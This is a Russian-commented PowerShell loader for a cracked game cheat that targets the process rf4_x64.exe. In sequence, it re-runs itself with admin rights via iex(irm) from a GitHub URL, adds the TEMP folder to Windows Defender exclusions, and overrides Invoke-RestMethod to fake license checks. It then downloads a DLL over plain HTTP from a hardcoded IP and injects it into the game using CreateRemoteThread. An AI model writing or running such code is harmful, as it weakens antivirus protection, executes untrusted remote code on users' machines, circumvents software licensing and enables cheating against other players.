# ============================================
# FISHCODE STUDIO — ПОЛНЫЙ ЗАГРУЗЧИК
# API всегда успех, DLL с сервера
# ============================================

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# Проверка админа
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"iex(irm 'https://raw.githubusercontent.com/Cubicplay471lm/-/refs/heads/main/pizdec.ps1')`""
    $psi.Verb = "runas"
    try { [Diagnostics.Process]::Start($psi) | Out-Null; Exit } catch { Exit 1 }
}

# Реестр
if (-not (Test-Path "HKCU:\Software\FishCodeStudio")) {
    New-Item -Path "HKCU:\Software\FishCodeStudio" -Force | Out-Null
}
Set-ItemProperty -Path "HKCU:\Software\FishCodeStudio" -Name "ServerRegion" -Value "NL"

# Отключаем Defender
function Add-DefenderTempExclusion {
    try {
        if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) { return }
        $defenderService = Get-Service WinDefend -ErrorAction SilentlyContinue
        if (-not $defenderService -or $defenderService.Status -ne 'Running') { return }
        $preferences = Get-MpPreference -ErrorAction Stop
        $tempPath = $env:TEMP.TrimEnd('\')
        $alreadyExcluded = $preferences.ExclusionPath | Where-Object { $_.TrimEnd('\') -ieq $tempPath }
        if ($alreadyExcluded) { return }
        Add-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
    } catch {}
}
Add-DefenderTempExclusion

# ============================================
# ГЛАВНОЕ: API ВСЕГДА УСПЕХ, DLL С СЕРВЕРА
# ============================================

# 1. Определяем URL
$Script:BaseDomain   = "http://127.0.0.1"           # API → локально
$Script:ApiUrl       = "http://127.0.0.1/api.php"   # API → локально
$Script:DllUrl       = "http://202.148.53.182/version.dll"  # DLL → ОРИГИНАЛ
$Script:RegistryPath = "HKCU:\Software\FishCodeStudio"

# 2. Получаем HWID
$SystemDriveLetter = [System.Environment]::GetEnvironmentVariable("SystemDrive")
try {
    $DriveInfo = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = '$SystemDriveLetter'" -ErrorAction Stop
    if ($null -eq $DriveInfo -or [string]::IsNullOrWhiteSpace($DriveInfo.VolumeSerialNumber)) {
        $Hwid = "0000"
    } else {
        $Hwid = [Convert]::ToUInt32($DriveInfo.VolumeSerialNumber, 16).ToString()
    }
} catch {
    $Hwid = "0000"
}

# 3. Читаем ключи из реестра
$SavedKey = ""
$SavedBoatKey = ""
if (Test-Path $Script:RegistryPath) {
    $SavedKey = (Get-ItemProperty -Path $Script:RegistryPath -Name "LicenseKey" -ErrorAction SilentlyContinue).LicenseKey
    $SavedBoatKey = (Get-ItemProperty -Path $Script:RegistryPath -Name "LicenseKeyBoat" -ErrorAction SilentlyContinue).LicenseKeyBoat
} else {
    [void](New-Item -Path $Script:RegistryPath -Force)
}

# 4. Очищаем старые DLL
Get-ChildItem $env:TEMP -Filter "RuntimeCache_*.dll" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
$TargetDllPath = Join-Path $env:TEMP ("RuntimeCache_" + [Guid]::NewGuid().ToString() + ".dll")

# 5. ПЕРЕХВАТ API — ВСЕГДА УСПЕХ
function Invoke-RestMethod {
    param(
        [string]$Uri,
        [string]$Method,
        [hashtable]$Body,
        [hashtable]$Headers,
        [int]$TimeoutSec,
        [string]$OutFile
    )
    
    # Если запрос к API — отвечаем локально
    if ($Uri -like "*api.php*") {
        $source = $Body['source']
        Write-Host "[*] API перехвачен: $source" -ForegroundColor Yellow
        
        if ($source -eq 'check') {
            Write-Host "[+] Ключ принят (BOAT)" -ForegroundColor Green
            return "success_check|product=BOAT"
        } elseif ($source -eq 'loader') {
            # Скачиваем DLL с оригинала
            Write-Host "[*] Скачиваем DLL с оригинала..." -ForegroundColor Yellow
            $dllPath = Join-Path $env:TEMP "version_original.dll"
            Invoke-WebRequest -Uri "http://202.148.53.182/version.dll" -OutFile $dllPath
            Write-Host "[+] DLL скачана: $dllPath" -ForegroundColor Green
            return $dllPath
        }
        
        return "success_check|product=BOAT"
    }
    
    # Если не API — оригинальный вызов
    Write-Host "[*] Прокси: $Uri" -ForegroundColor Gray
    return Microsoft.PowerShell.Utility\Invoke-RestMethod @PSBoundParameters
}

# 6. Подставляем фейковые ключи (чтобы не просило ввод)
$CurrentInputKey = "FAKE_KEY"
$SavedKey = "FAKE_KEY"
$SavedBoatKey = "FAKE_KEY"

# Сохраняем в реестр
Set-ItemProperty -Path $Script:RegistryPath -Name "LicenseKey" -Value $CurrentInputKey -Force
Set-ItemProperty -Path $Script:RegistryPath -Name "LicenseKeyBoat" -Value $CurrentInputKey -Force

Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "       FISHCODE STUDIO       " -ForegroundColor Cyan
Write-Host "  https://t.me/FishCodeStudio" -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "[✔] Лицензия: BOAT (кряк)" -ForegroundColor Green
Write-Host "[*] Ожидание игры rf4_x64.exe..." -ForegroundColor Yellow

# 7. Ждём игру
while (-not (Get-Process -Name "rf4_x64" -ErrorAction SilentlyContinue)) {
    Start-Sleep -Milliseconds 150
}

Write-Host "[✔] Игра обнаружена!" -ForegroundColor Green
Write-Host "[*] Инжект..." -ForegroundColor Yellow

# 8. Скачиваем DLL (если не скачана)
if (-not (Test-Path $TargetDllPath)) {
    Write-Host "[*] Скачиваем DLL с оригинала..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri "http://202.148.53.182/version.dll" -OutFile $TargetDllPath
    Write-Host "[+] DLL скачана: $TargetDllPath" -ForegroundColor Green
}

# 9. Инжект
$WinApiCode = @"
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int p);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr ad, uint s, int t, int fl);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr ad, byte[] b, uint s, out int w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr r, IntPtr arg, uint f, IntPtr id);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
"@

$WinApiType = Add-Type -MemberDefinition $WinApiCode -Name 'EngineInject' -Namespace 'Win32' -PassThru
$GameProcess = Get-Process -Name "rf4_x64" -ErrorAction SilentlyContinue
$hProcess = [Win32.EngineInject]::OpenProcess(0x1F0FFF, $false, $GameProcess.Id)
$dllBytes = [System.Text.Encoding]::ASCII.GetBytes($TargetDllPath + "`0")
$allocMem = [Win32.EngineInject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllBytes.Length, 0x3000, 0x40)
[Win32.EngineInject]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, [uint32]$dllBytes.Length, [ref]$null) | Out-Null
$loadLibraryAddress = [Win32.EngineInject]::GetProcAddress([Win32.EngineInject]::GetModuleHandle('kernel32.dll'), 'LoadLibraryA')
[Win32.EngineInject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddress, $allocMem, 0, [IntPtr]::Zero) | Out-Null

Write-Host "[✔] Инжект выполнен! Чит активен." -ForegroundColor Green
Start-Sleep -Seconds 3
Exit 0